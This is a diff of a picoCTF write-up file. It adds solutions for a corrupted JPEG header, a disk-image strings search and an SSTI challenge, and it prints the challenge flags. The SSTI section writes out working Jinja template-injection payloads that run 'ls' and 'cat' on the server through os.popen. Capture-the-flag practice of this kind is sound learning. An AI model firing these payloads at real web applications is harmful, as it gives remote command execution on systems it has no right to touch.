@@ -93,14 +93,14 @@ In devetools of browser
 ~~"flag": "picoCTF{brut4_f0rc4_b3a957eb}"~~
 
 ##	Corrupted file
-This file seems broken... or is it? Maybe a couple of bytes could make all the difference. Can you figure out how to bring it back to life?Download the file here.
+This file seems broken... or is it? Maybe a couple of bytes could make all the difference. Can you figure out how to bring it back to life?Download the file [here](https://challenge-files.picoctf.net/c_amiable_citadel/10f12b1f51f0a73a50f6bd08cc2d0ef6b1e8039a27daac52f27b450dabeaec97/file).
 
 ### Actions Performed
-Hint 1: Try checking the file’s header.
+**Hint 1:** Try checking the file’s header.
 
-Hint 2:JPEG
+**Hint 2:** JPEG
 
-Hint 3: Tools like xxd or hexdump can help you inspect and edit file bytes.
+**Hint 3:** Tools like xxd or hexdump can help you inspect and edit file bytes.
 
 From the hints, file type is JPEG.
 Created a dummy JPEG file from paint.
@@ -109,3 +109,35 @@ updated the header and renamed
 Flag is displayed in JPEG image.
 
  ~~picoCTF{r3st0r1ng_th3_by73s_efd8c6c0}~~
+
+##	DISKO 1
+Can you find the flag in this disk image?Download the disk image [here](https://artifacts.picoctf.net/c/537/disko-1.dd.gz).
+
+### Actions Performed
+**Hint 1:** Maybe Strings could help? If only there was a way to do that?
+
+1. Downloaded the file gz.
+2. Extracted the dd file from the gz
+3. Strings on dd file gave the flag   (strings disko-1.dd | grep pico)
+ 
+ ~~picoCTF{1t5_ju5t_4_5tr1n9_be6031da}~~
+
+ ## SSTI1
+I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps!
+
+### Actions Performed
+Launched the website, its has only a textbox to enter string. On submit, a new page opens with text as announcement
+
+Tried for SSTI. **(from Hint)**
+> Entered {{7*7}}  => announcement is 49. **Indicates that it is a Jinja server**
+
+Now tried for request object  {{request}}
+`{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
+
+Read the contents of the folder.
+
+The working directory contains, few files. One of them is file.
+Cat the file to read its contents
+` {{request.application.__globals__.__builtins__.__import__('os').popen("cat file").read()}}`
+
+~~picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}~~
